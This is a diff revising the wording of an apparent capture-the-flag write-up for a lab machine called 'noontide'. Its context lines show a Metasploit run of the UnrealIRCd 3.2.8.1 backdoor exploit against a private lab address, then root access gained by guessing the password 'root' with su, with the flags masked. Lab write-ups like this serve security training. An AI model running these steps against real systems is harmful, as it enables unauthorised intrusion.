@@ -30,7 +30,7 @@ UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                  
 UnrealIRCd 3.x - Remote Denial of Service                                                            | windows/dos/27407.pl
 ----------------------------------------------------------------------------------------------------- ---------------------------------
 ```
--> I select the exploit and and payload and run 
+-> I select the exploit and the payload and run 
 ```
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > use exploit/unix/irc/unreal_ircd_3281_backdoor 
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.167.120
@@ -80,7 +80,7 @@ cat local.txt
 f*************************************9                                                                                                                                                                                                            
 server@noontide:~$ 
 ```
--> Now we need to escalate privileges, normally I try root:root login, so I do an su root and try the password "root" and I got it 
+->  Now we need to escalate privileges. Normally I try root:root login, so I tried a su root and tried the password "root" and I got it. It was way as simple as I thought.
 ```
 server@noontide:~$ su root
 su root
@@ -100,4 +100,4 @@ cat proof.txt
 e**********************************6
 root@noontide:~# 
 ```
--> This was an easy one!
+-> This was a very easy one!
